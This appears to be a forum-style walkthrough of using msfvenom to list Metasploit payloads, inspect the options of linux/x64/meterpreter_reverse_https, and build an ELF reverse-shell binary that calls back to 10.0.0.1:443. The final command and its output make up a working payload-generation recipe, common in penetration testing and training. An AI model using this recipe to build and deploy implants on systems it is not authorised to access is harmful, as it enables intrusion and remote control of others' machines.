There is many ways to create a payload but one of the easiest is using msfvenom.  
To find a payload to use you can list all payloads with `msfvenom -l payloads`   
We can further filter this down to fit our requirements by piping this to grep   

```console
root@kali:~# msfvenom -l payloads | grep linux/x64
    linux/x64/exec                                      Execute an arbitrary command                               
    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)
    linux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)       
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection    
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell    
    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell          
    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.                                                                 
    linux/x64/shell_find_port                           Spawn a shell on an established connection                 
    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
```    

From this we can see that `linux/x64/meterpreter_reverse_https` would be a good payload to use.   

To see the options you run   
```console
root@kali:~# msfvenom -p linux/x64/meterpreter_reverse_https --list-options
Options for payload/linux/x64/meterpreter_reverse_https:                                                           
=========================                                                                                          
                                                                                                                   
                                                                                                                   
       Name: Linux Meterpreter, Reverse HTTPS Inline                                                               
     Module: payload/linux/x64/meterpreter_reverse_https                                                           
   Platform: Linux                                                                                                 
       Arch: x64
Needs Admin: No
 Total size: 1046512
       Rank: Normal

Provided by:
    Adam Cammack <adam_cammack@rapid7.com>
    Brent Cook <brent_cook@rapid7.com>
    timwr

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The local listener hostname
LPORT  8443             yes       The local listener port
LURI                    no        The HTTP Path

Description:
  Run the Meterpreter / Mettle server payload (stageless)



Advanced options for payload/linux/x64/meterpreter_reverse_https:
=========================

    Name                         Current Setting                                                Required  Description
    ----                         ---------------                                                --------  -----------
    AutoLoadStdapi               true                                                           yes       Automatically load the Stdapi extension
    AutoRunScript                                                                               no        A script to run automatically on session creation.
    AutoSystemInfo               true                                                           yes       Automatically capture system information on initialization.
    AutoUnhookProcess            false                                                          yes       Automatically load the unhook extension and unhook the process
    AutoVerifySession            true                                                           yes       Automatically verify and drop invalid sessions
    AutoVerifySessionTimeout     30                                                             no        Timeout period to wait for session validation to occur, in seconds
    EnableUnicodeEncoding        false                                                          yes       Automatically encode UTF-8 strings as hexadecimal
    HandlerSSLCert                                                                              no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
    HttpServerName               Apache                                                         no        The server header that the handler will send in response to requests
    HttpUnknownRequestResponse   <html><body><h1>It works!</h1></body></html>                   no        The returned HTML response body when the handler receives a request that is not from a payload
    HttpUserAgent                Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko  no        The user-agent that the payload should use for communication
    IgnoreUnknownPayloads        false                                                          yes       Whether to drop connections from payloads using unknown UUIDs
    InitialAutoRunScript                                                                        no        An initial script to run on session creation (before AutoRunScript)
    OverrideLHOST                                                                               no        When OverrideRequestHost is set, use this value as the host name for secondary requests
    OverrideLPORT                                                                               no        When OverrideRequestHost is set, use this value as the port number for secondary requests
    OverrideRequestHost          false                                                          yes       Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT
    OverrideScheme                                                                              no        When OverrideRequestHost is set, use this value as the scheme for secondary requests, e.g http or https
    PayloadProcessCommandLine                                                                   no        The displayed command line that will be used by the payload
    PayloadUUIDName                                                                             no        A human-friendly name to reference this unique payload (requires tracking)
    PayloadUUIDRaw                                                                              no        A hex string representing the raw 8-byte PUID value for the UUID
    PayloadUUIDSeed                                                                             no        A string to use when generating the payload UUID (deterministic)
    PayloadUUIDTracking          false                                                          yes       Whether or not to automatically register generated UUIDs
    PingbackRetries              0                                                              yes       How many additional successful pingbacks
    PingbackSleep                30                                                             yes       Time (in seconds) to sleep between pingbacks
    ReverseAllowProxy            false                                                          yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
    ReverseListenerBindAddress                                                                  no        The specific IP address to bind to on the local system
    ReverseListenerBindPort                                                                     no        The port to bind to on the local system if different from LPORT
    SessionCommunicationTimeout  300                                                            no        The number of seconds of no activity before this session should be killed
    SessionExpirationTimeout     604800                                                         no        The number of seconds before this session should be forcibly shut down
    SessionRetryTotal            3600                                                           no        Number of seconds try reconnecting for on network failure
    SessionRetryWait             10                                                             no        Number of seconds to wait between reconnect attempts
    StagerVerifySSLCert          false                                                          no        Whether to verify the SSL certificate in Meterpreter
    VERBOSE                      false                                                          no        Enable detailed status messages
    WORKSPACE                                                                                   no        Specify the workspace for this module

Evasion options for payload/linux/x64/meterpreter_reverse_https:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
```

You can see that the Basic options of LHOST and LPORT are required, to input these options you put the variables in after the the payload before the next argument.   
`msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1`   

After this you other options that can be important are:   
--arch              # Set Architecture
--platform          # Set Platform   
-f                  # Set Format   
-e                  # Set Encoders   
-o                  # Set Outfile   

All of these options can be used with --list to show valid options.   

For Your Senario -f elf will work.

The final command should look as follows:   
```console
root@kali:~# msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1 -f elf -o reverse_shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1046512 bytes
Final size of elf file: 1046512 bytes
Saved as: reverse_shell
```
